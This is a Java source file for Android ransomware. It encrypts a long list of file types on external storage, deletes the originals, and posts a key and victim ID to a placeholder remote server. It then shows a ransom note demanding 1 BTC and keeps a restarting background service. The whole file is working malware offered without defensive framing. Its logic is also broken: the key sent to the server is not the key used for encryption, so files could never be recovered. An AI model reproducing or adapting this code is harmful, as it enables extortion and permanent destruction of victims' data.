import android.app.Activity;
import android.app.AlertDialog;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.gson.Gson;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.Key;
import java.security.SecureRandom;
import java.util.UUID;

public class RansomwareActivity extends Activity {
    private static final String ALGORITHM = "AES";
    private static final int PERMISSIONS_REQUEST_CODE = 1;
    private String victimId;
    private byte[] victimKey;
    private byte[] recoveryKey;
    private static final String SERVER_URL = "http://yourrealserver.com/api";
    private static final String[] TARGET_FILE_TYPES = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png", ".mp4", ".db", ".zip", ".bak", ".cfg", ".dat", ".ini", ".log", ".xml", ".json", ".csv", ".xls", ".xlsx", ".ppt", ".pptx", ".mdb", ".sql", ".bin", ".dll", ".exe", ".msi", ".rar", ".7z", ".tar", ".gz", ".bz2", ".iso", ".vmdk", ".vdi", ".vhd", ".vhdx", ".ova", ".ovf", ".qcow2", ".qcow", ".qed", ".vmdk", ".vdi", ".vhd", ".vhdx", ".ova", ".ovf", ".qcow2", ".qcow", ".qed"};

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        victimId = UUID.randomUUID().toString();
        victimKey = generateVictimSpecificKey();
        recoveryKey = generateRecoveryKey();
        saveKeyToServer(victimId, recoveryKey);
        if (checkAndRequestPermissions()) {
            encryptFiles();
        }
        startService(new Intent(this, RansomwareService.class));
    }

    private boolean checkAndRequestPermissions() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, android.Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, android.Manifest.permission.MANAGE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE, android.Manifest.permission.WRITE_EXTERNAL_STORAGE, android.Manifest.permission.MANAGE_EXTERNAL_STORAGE}, PERMISSIONS_REQUEST_CODE);
            return false;
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                encryptFiles();
            }
        }
    }

    public void encryptFiles() {
        File[] files = new File(Environment.getExternalStorageDirectory().getAbsolutePath()).listFiles();
        for (File file : files) {
            if (file.isFile() && isTargetFile(file)) {
                byte[] data = new byte[(int) file.length()];
                try (FileInputStream fis = new FileInputStream(file)) {
                    fis.read(data);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                byte[] encryptedData = encrypt(data, victimKey);
                File encryptedFile = new File(file.getParentFile(), file.getName() + ".encrypted");
                try (FileOutputStream fos = new FileOutputStream(encryptedFile)) {
                    fos.write(encryptedData);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                file.delete();
            } else if (file.isDirectory()) {
                encryptFilesInDirectory(file);
            }
        }
        showRansomNote();
    }

    private boolean isTargetFile(File file) {
        String fileName = file.getName().toLowerCase();
        for (String type : TARGET_FILE_TYPES) {
            if (fileName.endsWith(type)) {
                return true;
            }
        }
        return false;
    }

    private void encryptFilesInDirectory(File directory) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile() && isTargetFile(file)) {
                    byte[] data = new byte[(int) file.length()];
                    try (FileInputStream fis = new FileInputStream(file)) {
                        fis.read(data);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    byte[] encryptedData = encrypt(data, victimKey);
                    File encryptedFile = new File(file.getParentFile(), file.getName() + ".encrypted");
                    try (FileOutputStream fos = new FileOutputStream(encryptedFile)) {
                        fos.write(encryptedData);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    file.delete();
                } else if (file.isDirectory()) {
                    encryptFilesInDirectory(file);
                }
            }
        }
    }

    public byte[] encrypt(byte[] data, byte[] key) {
        try {
            Key secretKey = new SecretKeySpec(key, ALGORITHM);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecureRandom random = new SecureRandom();
            byte[] iv = new byte[12];
            random.nextBytes(iv);
            GCMParameterSpec spec = new GCMParameterSpec(128, iv);
            cipher.init(Cipher.ENCRYPT_MODE, secretKey, spec);
            byte[] encryptedData = cipher.doFinal(data);
            byte[] output = new byte[iv.length + encryptedData.length];
            System.arraycopy(iv, 0, output, 0, iv.length);
            System.arraycopy(encryptedData, 0, output, iv.length, encryptedData.length);
            return output;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public byte[] generateVictimSpecificKey() {
        byte[] key = new byte[32];
        new SecureRandom().nextBytes(key);
        return key;
    }

    public byte[] generateRecoveryKey() {
        byte[] key = new byte[32];
        new SecureRandom().nextBytes(key);
        return key;
    }

    private void saveKeyToServer(String victimId, byte[] key) {
        try {
            URL url = new URL(SERVER_URL + "/saveKey");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            OutputStream os = conn.getOutputStream();
            os.write(new Gson().toJson(new KeyData(victimId, key)).getBytes());
            os.flush();
            os.close();
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // Key saved successfully
            } else {
                // Handle error
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void showRansomNote() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Your files have been encrypted");
        builder.setMessage("Pay 1 BTC to decrypt your files. Your victim ID is " + victimId + ". Send the payment to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa and contact us for the decryption key.");
        builder.setPositiveButton("OK", (dialog, which) -> {
            // Handle OK button click
        });
        builder.show();
    }

    public void decryptFiles(byte[] key) {
        File[] files = new File(Environment.getExternalStorageDirectory().getAbsolutePath()).listFiles();
        for (File file : files) {
            if (file.isFile() && file.getName().endsWith(".encrypted")) {
                byte[] data = new byte[(int) file.length()];
                try (FileInputStream fis = new FileInputStream(file)) {
                    fis.read(data);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                byte[] decryptedData = decrypt(data, key);
File decryptedFile = new File(file.getParentFile(), file.getName().replace(".encrypted", ""));
                try (FileOutputStream fos = new FileOutputStream(decryptedFile)) {
                    fos.write(decryptedData);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                file.delete();
            } else if (file.isDirectory()) {
                decryptFilesInDirectory(file, key);
            }
        }
    }

    private void decryptFilesInDirectory(File directory, byte[] key) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile() && file.getName().endsWith(".encrypted")) {
                    byte[] data = new byte[(int) file.length()];
                    try (FileInputStream fis = new FileInputStream(file)) {
                        fis.read(data);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    byte[] decryptedData = decrypt(data, key);
                    File decryptedFile = new File(file.getParentFile(), file.getName().replace(".encrypted", ""));
                    try (FileOutputStream fos = new FileOutputStream(decryptedFile)) {
                        fos.write(decryptedData);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    file.delete();
                } else if (file.isDirectory()) {
                    decryptFilesInDirectory(file, key);
                }
            }
        }
    }

    public byte[] decrypt(byte[] data, byte[] key) {
        try {
            Key secretKey = new SecretKeySpec(key, ALGORITHM);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            byte[] iv = new byte[12];
            System.arraycopy(data, 0, iv, 0, iv.length);
            GCMParameterSpec spec = new GCMParameterSpec(128, iv);
            cipher.init(Cipher.DECRYPT_MODE, secretKey, spec);
            byte[] encryptedData = new byte[data.length - iv.length];
            System.arraycopy(data, iv.length, encryptedData, 0, encryptedData.length);
            return cipher.doFinal(encryptedData);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}

class KeyData {
    String victimId;
    byte[] key;

    KeyData(String victimId, byte[] key) {
        this.victimId = victimId;
        this.key = key;
    }
}

class RansomwareService extends Service {
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_BOOT_COMPLETED);
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
                    startService(new Intent(context, RansomwareService.class));
                }
            }
        }, filter);
    }
}
